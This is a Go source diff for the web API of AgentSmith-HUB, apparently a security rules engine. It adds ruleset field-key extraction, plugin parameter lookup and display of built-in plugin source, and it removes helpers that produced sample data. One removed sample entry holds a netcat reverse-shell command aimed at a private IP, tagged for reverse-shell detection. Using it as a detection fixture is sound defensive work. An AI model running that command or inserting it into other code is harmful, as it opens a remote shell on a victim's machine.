@@ -11,11 +11,16 @@ import (
 	"AgentSmith-HUB/rules_engine"
 	"fmt"
 	"net/http"
+	"net/url"
 	"os"
 	"path"
+	"path/filepath"
+	"sort"
+	"strconv"
 	"strings"
 	"time"
 
+	"github.com/bytedance/sonic"
 	"github.com/labstack/echo/v4"
 )
 
@@ -85,7 +90,7 @@ const NewRulesetData = `<root name="test2" type="DETECTION">
             <node id="c" type="INCL" field="exe" logic="OR" delimiter="|">abc|edf</node>
             <node id="d" type="EQU" field="sessionid">_$sessionid</node>
         </checklist>
-        <append field_name="abc">123</append>
+        <append field="abc">123</append>
         <del>exe,argv</del>
     </rule>
 </root>`
@@ -403,22 +408,39 @@ func getPlugins(c echo.Context) error {
 		_, hasTemp := plugin.PluginsNew[p.Name]
 
 		plugins = append(plugins, map[string]interface{}{
-			"id":      p.Name,     // Use id field for consistency with other components
-			"name":    p.Name,     // Keep name for backward compatibility
-			"type":    pluginType, // Convert to string type for frontend differentiation
-			"hasTemp": hasTemp,
+			"id":         p.Name,     // Use id field for consistency with other components
+			"name":       p.Name,     // Keep name for backward compatibility
+			"type":       pluginType, // Convert to string type for frontend differentiation
+			"hasTemp":    hasTemp,
+			"returnType": p.ReturnType, // Include return type for filtering
 		})
 		processedNames[p.Name] = true
 	}
 
 	// Add plugins that only exist in temporary files
-	for name := range plugin.PluginsNew {
+	for name, content := range plugin.PluginsNew {
 		if !processedNames[name] {
+			// Try to determine return type for temporary plugins
+			returnType := "unknown"
+			if content != "" {
+				// Create a temporary plugin instance to get return type
+				tempPlugin := &plugin.Plugin{
+					Name:    name,
+					Payload: []byte(content),
+					Type:    plugin.YAEGI_PLUGIN,
+				}
+				// Try to load temporarily to get return type
+				if err := tempPlugin.YaegiLoad(); err == nil {
+					returnType = tempPlugin.ReturnType
+				}
+			}
+
 			plugins = append(plugins, map[string]interface{}{
-				"id":      name,  // Use id field for consistency with other components
-				"name":    name,  // Keep name for backward compatibility
-				"type":    "new", // Mark as new plugin
-				"hasTemp": true,
+				"id":         name,  // Use id field for consistency with other components
+				"name":       name,  // Keep name for backward compatibility
+				"type":       "new", // Mark as new plugin
+				"hasTemp":    true,
+				"returnType": returnType, // Include return type for filtering
 			})
 		}
 	}
@@ -453,10 +475,22 @@ func getPlugin(c echo.Context) error {
 
 		if p.Type == plugin.LOCAL_PLUGIN {
 			pluginType = "local"
-			// For local plugins, display explanatory information
-			rawContent = fmt.Sprintf(`// Built-in Plugin: %s
+			// For local plugins, try to read the actual source code
+			sourceCode, err := readLocalPluginSource(id)
+			if err != nil {
+				// Fallback to explanatory text if source cannot be read
+				rawContent = fmt.Sprintf(`// Built-in Plugin: %s
 // This is a built-in plugin that cannot be viewed or edited.
-// Built-in plugins are compiled into the application and provide core functionality.`, id)
+// Built-in plugins are compiled into the application and provide core functionality.
+// Error reading source: %s`, id, err.Error())
+			} else {
+				// Add header comment to indicate this is a built-in plugin
+				rawContent = fmt.Sprintf(`// Built-in Plugin: %s (Read-Only)
+// This is a built-in plugin source code for reference only.
+// Built-in plugins cannot be modified through the web interface.
+
+%s`, id, sourceCode)
+			}
 		} else if p.Type == plugin.YAEGI_PLUGIN {
 			pluginType = "yaegi"
 			rawContent = string(p.Payload)
@@ -1209,153 +1243,300 @@ func GetSamplerData(c echo.Context) error {
 	return c.JSON(http.StatusOK, response)
 }
 
-// Helper function to generate sample data for inputs
-func generateInputSampleData(input *input.Input) []interface{} {
-	samples := make([]interface{}, 0)
-
-	switch input.Type {
-	case "kafka":
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"message":   "Sample Kafka message",
-				"topic":     input.Config.Kafka.Topic,
-				"partition": 0,
-				"offset":    12345,
-				"key":       "sample-key",
-				"value": map[string]interface{}{
-					"user_id":   "user123",
-					"action":    "login",
-					"ip":        "192.168.1.100",
-					"timestamp": time.Now().Unix(),
-				},
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "kafka_input_sample",
-		})
-	case "aliyun_sls":
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"project":  input.Config.AliyunSLS.Project,
-				"logstore": input.Config.AliyunSLS.Logstore,
-				"topic":    "sample-topic",
-				"content": map[string]interface{}{
-					"level":   "INFO",
-					"message": "Sample SLS log message",
-					"module":  "auth",
-					"user":    "user123",
-				},
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "aliyun_sls_input_sample",
-		})
-	default:
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"type": "sample",
-				"data": "Sample input data",
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "generic_input_sample",
+// GetRulesetFields extracts field keys from sample data for intelligent completion in ruleset editing
+func GetRulesetFields(c echo.Context) error {
+	componentId := c.Param("id")
+	if componentId == "" {
+		return c.JSON(http.StatusBadRequest, map[string]interface{}{
+			"error": "Component ID is required",
 		})
 	}
 
-	return samples
+	logger.Info("GetRulesetFields request",
+		"componentId", componentId)
+
+	nodeSequence := fmt.Sprintf("ruleset.%s", componentId)
+	var allSampleData []map[string]interface{}
+
+	// Get potential sampler names based on component types and IDs
+	samplerNames := []string{}
+	common.GlobalMu.RLock()
+	for inputId := range project.GlobalProject.Inputs {
+		samplerNames = append(samplerNames, "input."+inputId)
+	}
+	for rulesetId := range project.GlobalProject.Rulesets {
+		samplerNames = append(samplerNames, "ruleset."+rulesetId)
+	}
+	for outputId := range project.GlobalProject.Outputs {
+		samplerNames = append(samplerNames, "output."+outputId)
+	}
+	common.GlobalMu.RUnlock()
+
+	// Collect sample data from all potential sources
+	for _, samplerName := range samplerNames {
+		sampler := common.GetSampler(samplerName)
+		if sampler != nil {
+			samples := sampler.GetSamples()
+			for projectNodeSequence, sampleDataList := range samples {
+				// Match samples that flow into this ruleset
+				if strings.HasSuffix(projectNodeSequence, nodeSequence) {
+					for _, sample := range sampleDataList {
+						if sampleMap, ok := sample.Data.(map[string]interface{}); ok {
+							allSampleData = append(allSampleData, sampleMap)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Extract all possible field keys from the sample data
+	fieldKeys := extractFieldKeys(allSampleData)
+
+	response := map[string]interface{}{
+		"componentId": componentId,
+		"fieldKeys":   fieldKeys,
+		"sampleCount": len(allSampleData),
+	}
+
+	logger.Info("GetRulesetFields response ready",
+		"componentId", componentId,
+		"fieldCount", len(fieldKeys),
+		"sampleCount", len(allSampleData))
+
+	return c.JSON(http.StatusOK, response)
 }
 
-// Helper function to generate sample data for outputs
-func generateOutputSampleData(output *output.Output) []interface{} {
-	samples := make([]interface{}, 0)
+// extractFieldKeys recursively extracts all possible field paths from sample data
+func extractFieldKeys(sampleData []map[string]interface{}) []string {
+	fieldSet := make(map[string]bool)
 
-	switch output.Type {
-	case "kafka":
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"topic": output.Config.Kafka.Topic,
-				"message": map[string]interface{}{
-					"alert_id":    "alert123",
-					"severity":    "high",
-					"description": "Sample security alert",
-					"source_ip":   "192.168.1.100",
-					"detected_at": time.Now().Unix(),
-				},
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "kafka_output_sample",
-		})
-	case "elasticsearch":
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"index": output.Config.Elasticsearch.Index,
-				"document": map[string]interface{}{
-					"@timestamp":  time.Now().Format(time.RFC3339),
-					"event_type":  "security_alert",
-					"severity":    "medium",
-					"description": "Sample ES document",
-				},
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "elasticsearch_output_sample",
-		})
-	case "print":
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"output": "Sample print output",
-				"level":  "INFO",
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "print_output_sample",
-		})
-	default:
-		samples = append(samples, map[string]interface{}{
-			"data": map[string]interface{}{
-				"data": "Sample output data",
-			},
-			"timestamp": time.Now().Format(time.RFC3339),
-			"source":    "generic_output_sample",
+	for _, sample := range sampleData {
+		extractKeysFromMap(sample, "", fieldSet)
+	}
+
+	// Convert set to sorted slice
+	var fields []string
+	for field := range fieldSet {
+		fields = append(fields, field)
+	}
+
+	// Sort fields for consistent output
+	sort.Strings(fields)
+
+	return fields
+}
+
+// extractKeysFromMap recursively extracts keys from a nested map structure
+func extractKeysFromMap(data map[string]interface{}, prefix string, fieldSet map[string]bool) {
+	for key, value := range data {
+		// Build the field path
+		var fieldPath string
+		if prefix == "" {
+			fieldPath = key
+		} else {
+			fieldPath = prefix + "." + key
+		}
+
+		// Add current field path
+		fieldSet[fieldPath] = true
+
+		// Process nested structures
+		switch v := value.(type) {
+		case map[string]interface{}:
+			// Nested map - recurse
+			extractKeysFromMap(v, fieldPath, fieldSet)
+		case []interface{}:
+			// Array - check elements
+			for i, item := range v {
+				indexedPath := fieldPath + ".#_" + strconv.Itoa(i)
+				fieldSet[indexedPath] = true
+
+				if itemMap, ok := item.(map[string]interface{}); ok {
+					extractKeysFromMap(itemMap, indexedPath, fieldSet)
+				}
+			}
+		case string:
+			// Only parse as JSON if it's clearly JSON (starts with { or [)
+			if (strings.HasPrefix(v, "{") && strings.HasSuffix(v, "}")) ||
+				(strings.HasPrefix(v, "[") && strings.HasSuffix(v, "]")) {
+				var jsonData map[string]interface{}
+				if err := sonic.Unmarshal([]byte(v), &jsonData); err == nil {
+					extractKeysFromMap(jsonData, fieldPath, fieldSet)
+				}
+			}
+			// Only parse as URL query string if it looks like one (contains = and &)
+			if strings.Contains(v, "=") && (strings.Contains(v, "&") || strings.Count(v, "=") == 1) {
+				if parsed, err := url.ParseQuery(v); err == nil && len(parsed) > 0 {
+					queryMap := make(map[string]interface{})
+					for qKey, qValues := range parsed {
+						queryMap[qKey] = strings.Join(qValues, "")
+					}
+					extractKeysFromMap(queryMap, fieldPath, fieldSet)
+				}
+			}
+		}
+	}
+}
+
+// GetPluginParameters returns parameter information for a specific plugin
+func GetPluginParameters(c echo.Context) error {
+	id := c.Param("id")
+	if id == "" {
+		return c.JSON(http.StatusBadRequest, map[string]interface{}{
+			"success": false,
+			"error":   "Plugin ID is required",
 		})
 	}
 
-	return samples
+	// Check if plugin exists in memory
+	if p, exists := plugin.Plugins[id]; exists {
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"success":    true,
+			"plugin":     id,
+			"parameters": p.Parameters,
+			"returnType": p.ReturnType,
+		})
+	}
+
+	// Check if plugin exists in temporary files
+	if tempContent, exists := plugin.PluginsNew[id]; exists {
+		// Create a temporary plugin instance to parse parameters
+		tempPlugin := &plugin.Plugin{
+			Name:    id,
+			Payload: []byte(tempContent),
+			Type:    plugin.YAEGI_PLUGIN,
+		}
+
+		// Try to load the temporary plugin to get parameters
+		err := tempPlugin.YaegiLoad()
+		if err != nil {
+			return c.JSON(http.StatusOK, map[string]interface{}{
+				"success": false,
+				"error":   fmt.Sprintf("Failed to parse temporary plugin: %v", err),
+			})
+		}
+
+		return c.JSON(http.StatusOK, map[string]interface{}{
+			"success":    true,
+			"plugin":     id,
+			"parameters": tempPlugin.Parameters,
+			"returnType": tempPlugin.ReturnType,
+		})
+	}
+
+	return c.JSON(http.StatusNotFound, map[string]interface{}{
+		"success": false,
+		"error":   "Plugin not found: " + id,
+	})
 }
 
-// Helper function to generate sample data for rulesets
-func generateRulesetSampleData(ruleset *rules_engine.Ruleset) []interface{} {
-	samples := make([]interface{}, 0)
+// readLocalPluginSource reads the source code of a built-in plugin
+func readLocalPluginSource(pluginName string) (string, error) {
+	// Get current working directory
+	wd, err := os.Getwd()
+	if err != nil {
+		logger.Warn("Failed to get working directory", "error", err)
+		wd = "."
+	}
 
-	// Generate sample data that would trigger rules
-	samples = append(samples, map[string]interface{}{
-		"data": map[string]interface{}{
-			"rule_type": "detection",
-			"input_data": map[string]interface{}{
-				"command":   "/bin/bash",
-				"args":      []string{"-c", "nc -e /bin/sh 192.168.1.1 4444"},
-				"user":      "www-data",
-				"pid":       1234,
-				"source_ip": "192.168.1.100",
-			},
-			"matched_rules": []string{"reverse_shell_detection"},
-			"severity":      "high",
-		},
-		"timestamp": time.Now().Format(time.RFC3339),
-		"source":    "ruleset_detection_sample",
-	})
+	// Map plugin names to their source file paths
+	var sourcePath string
+	switch pluginName {
+	case "isLocalIP":
+		// Try multiple possible paths
+		possiblePaths := []string{
+			filepath.Join(wd, "local_plugin", "is_local_ip", "is_local_ip.go"),
+			filepath.Join(wd, "src", "local_plugin", "is_local_ip", "is_local_ip.go"),
+			"local_plugin/is_local_ip/is_local_ip.go",
+			"src/local_plugin/is_local_ip/is_local_ip.go",
+		}
 
-	samples = append(samples, map[string]interface{}{
-		"data": map[string]interface{}{
-			"rule_type": "classification",
-			"input_data": map[string]interface{}{
-				"http_method": "POST",
-				"url":         "/admin/login",
-				"status_code": 401,
-				"user_agent":  "curl/7.68.0",
-				"source_ip":   "192.168.1.200",
-			},
-			"classification": "suspicious_login_attempt",
-			"confidence":     0.85,
-		},
-		"timestamp": time.Now().Format(time.RFC3339),
-		"source":    "ruleset_classification_sample",
-	})
+		for _, path := range possiblePaths {
+			if _, err := os.Stat(path); err == nil {
+				sourcePath = path
+				break
+			}
+		}
 
-	return samples
+	case "parseJSON":
+		// Try multiple possible paths
+		possiblePaths := []string{
+			filepath.Join(wd, "local_plugin", "local_plugin.go"),
+			filepath.Join(wd, "src", "local_plugin", "local_plugin.go"),
+			"local_plugin/local_plugin.go",
+			"src/local_plugin/local_plugin.go",
+		}
+
+		for _, path := range possiblePaths {
+			if _, err := os.Stat(path); err == nil {
+				sourcePath = path
+				break
+			}
+		}
+	}
+
+	if sourcePath == "" {
+		return "", fmt.Errorf("source file not found for plugin: %s", pluginName)
+	}
+
+	// Read the source file
+	content, err := os.ReadFile(sourcePath)
+	if err != nil {
+		return "", fmt.Errorf("failed to read source file %s: %w", sourcePath, err)
+	}
+
+	// For parseJSON, we need to extract only the relevant function
+	if pluginName == "parseJSON" {
+		return extractParseJSONFunction(string(content)), nil
+	}
+
+	return string(content), nil
+}
+
+// extractParseJSONFunction extracts the parseJSON function from local_plugin.go
+func extractParseJSONFunction(content string) string {
+	lines := strings.Split(content, "\n")
+	var result []string
+	inFunction := false
+	braceCount := 0
+
+	for _, line := range lines {
+		if strings.Contains(line, "func parseJSONData") {
+			inFunction = true
+			braceCount = 0
+		}
+
+		if inFunction {
+			result = append(result, line)
+
+			// Count braces to determine function end
+			for _, char := range line {
+				if char == '{' {
+					braceCount++
+				} else if char == '}' {
+					braceCount--
+					if braceCount == 0 {
+						inFunction = false
+						break
+					}
+				}
+			}
+		}
+	}
+
+	if len(result) > 0 {
+		// Add package declaration and imports for context
+		return `package plugin
+
+import (
+"encoding/json"
+"errors"
+)
+
+// parseJSONData parses JSON string and returns parsed data (for testing interface{} return type)
+` + strings.Join(result[1:], "\n") // Skip the first line as we already added the function comment
+	}
+
+	return content // Fallback to full content if extraction fails
 }
